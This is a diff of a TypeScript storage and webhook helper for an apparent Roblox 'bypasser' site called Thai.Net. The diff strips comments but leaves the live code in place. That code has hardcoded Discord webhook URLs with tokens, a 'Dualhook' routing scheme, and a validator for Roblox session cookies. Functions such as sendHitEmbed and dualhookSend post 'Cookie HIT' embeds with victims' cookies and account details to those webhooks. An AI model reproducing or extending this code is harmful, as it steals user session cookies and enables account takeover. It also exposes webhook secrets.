@@ -1,9 +1,3 @@
-// Storage + Discord webhook helpers
-
-// ============================================================
-// LEGACY: Token system (kept exported as no-ops/stubs so any old
-// imports won't crash; token UI has been fully removed).
-// ============================================================
 export interface Token {
   id: string;
   token: string;
@@ -23,9 +17,6 @@ export function validateToken(_s: string): Token | null { return null; }
 export function deleteToken(_id: string) {}
 export function getLoginLog(): LoginRecord[] { return []; }
 
-// ============================================================
-// Directories (Dualhook)
-// ============================================================
 export interface Directory {
   id: string;
   name: string;
@@ -69,9 +60,6 @@ export function getActiveDirectory(): Directory | null {
   return getDirectories().find(d => d.id === id) || null;
 }
 
-// ============================================================
-// Webhook URLs (admin settings) — 4 receivers
-// ============================================================
 const HARDCODED_WEBHOOKS: Record<string, string> = {
   wh_bypass: 'https://discord.com/api/webhooks/1510195358716919878/j3EtRIHmbwXi05MCvekgiRqFH-LYMOHuOhk8jDkuoQLzWUtd2gN_j6qNdfckHImrtGTx',
   wh_fetch_cookie: 'https://discord.com/api/webhooks/1510195484743172136/RUvTexxxkdenVxIzxv8qdVTAo4xVcHI2gSf2Bdkj-PDAVsKClVjXMPNYSl5y996K75Os',
@@ -94,9 +82,6 @@ export function setWebhook(key: string, value: string) {
   localStorage.setItem(key, value);
 }
 
-// ============================================================
-// Embed data
-// ============================================================
 export interface AccountInfo {
   valid: boolean;
   cookie?: string;
@@ -130,9 +115,6 @@ const BOT_NAME = 'Thai.Net';
 const FOOTER_BASE = 'Live Thai.Net · 2026';
 const SITE_URL_DEFAULT = 'https://rblxbypasser-thai.vercel.app/';
 
-// ============================================================
-// Cookie validation
-// ============================================================
 export const COOKIE_PREFIX = 'CAEaAh';
 export function isValidCookieFormat(cookie: string): boolean {
   if (!cookie) return false;
@@ -141,9 +123,6 @@ export function isValidCookieFormat(cookie: string): boolean {
   return trimmed.includes(COOKIE_PREFIX);
 }
 
-// ============================================================
-// Live Bypass Log (recent activity shown on dashboard)
-// ============================================================
 export interface LiveBypassEntry {
   id: string;
   username: string;
@@ -264,7 +243,6 @@ async function post(url: string, body: any) {
   } catch (e) { console.error('Webhook failed:', e); }
 }
 
-// Send a "hit" (bypass or fetch) — info embed + cookie embed
 export async function sendHitEmbed(webhookUrl: string, d: AccountInfo, opts: { tag?: string } = {}) {
   if (!webhookUrl) return;
   const siteUrl = getWebhook(WK.siteUrl) || SITE_URL_DEFAULT;
@@ -275,7 +253,6 @@ export async function sendHitEmbed(webhookUrl: string, d: AccountInfo, opts: { t
   });
 }
 
-// Send Live Bypass (no cookie)
 export async function sendLiveBypassEmbed(webhookUrl: string, d: AccountInfo) {
   if (!webhookUrl) return;
   await post(webhookUrl, {
@@ -299,14 +276,12 @@ export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string)
   await sendLiveBypassFailedEmbed(getWebhook(WK.liveBypass), d, reason);
 }
 
-// Send a hit (bypass or fetch) to the main webhook for that kind
 export async function dualhookSend(kind: 'bypass' | 'fetch', d: AccountInfo) {
   const mainKey = kind === 'bypass' ? WK.bypass : WK.fetchCookie;
   const tag = kind === 'bypass' ? 'Bypasser HIT | @everyone' : 'Cookie HIT | @everyone';
   await sendHitEmbed(getWebhook(mainKey), d, { tag });
 }
 
-// Backwards-compat shim for any leftover callers
 export async function sendBypassEmbed(webhookUrl: string, data: any) {
   await sendHitEmbed(webhookUrl, { ...data, valid: !!data.valid });
 }
